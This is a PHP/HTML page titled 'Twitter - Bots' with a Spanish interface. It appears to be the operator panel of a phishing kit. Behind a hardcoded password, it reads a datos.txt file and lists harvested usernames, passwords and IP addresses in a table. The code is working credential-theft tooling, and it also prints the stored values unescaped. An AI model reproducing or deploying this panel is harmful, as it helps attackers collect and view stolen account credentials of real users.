
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Twitter - Bots</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
    <style>
    body {
      height:100%;
      width:100%;
      background-image: url("https://mal.sec.gd/images/bgSlider/img01.png");
      background-repeat: no-repeat;
      background-size:cover;
    }
    .espacio {
      margin-top: 5vh;
    }
    </style>
  </head>
  <body>
  <div class="container espacio">
  <div class="alert alert-danger">
    <?php
if (!isset($_POST["pass"])) {
    ?>
    <form method="POST" action="#">
      <input name="pass" type="password" class="form-control" placeholder="Contraseña"><br/>
      <button class="btn btn-danger btn-lg btn-block" type="submit">Entrar</button>
    </form>
    <?php
    exit;
} else {
if ($_POST["pass"] != "b3rn4t1x3r") {
  ?>
  <div class='alert alert-warning' role='alert'>Contraseña incorrecta</div>
  <form method="POST" action="#">
    <input name="pass" type="password" class="form-control" placeholder="Contraseña"><br/>
    <button class="btn btn-danger btn-lg btn-block" type="submit">Entrar</button>
  </form>
  <?php
} else {
?>
    <div class="text-right"><a class="btn btn-danger" href="">Salir</a></div>
    <h2>Datos de los usuarios</h2><hr/>
    <table class="table table-striped">
      <thead>
        <tr>
          <th>Usuario</th>
          <th>Contraseña</th>
          <th>IP</th>
        </tr>
      </thead>
      <tbody>
        <?php
        $fichero = fopen('datos.txt','r');
        while ($linea = fgets($fichero)) {
          $array = explode('<:>', trim($linea));
          echo "<tr>";
          echo "<th><font color='green'>". $array[0] ."</font></th>";
          echo "<th><font color='green'>". $array[1] ."</font></th>";
          echo "<th><font color='green'>". $array[2] ."</font></th>";
          echo "</tr>";
        }
        fclose($fichero);
        ?>
      </tbody>
    </table>
  </div>
  <?php
}
}
  ?>
  </div>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
  </body>
</html>
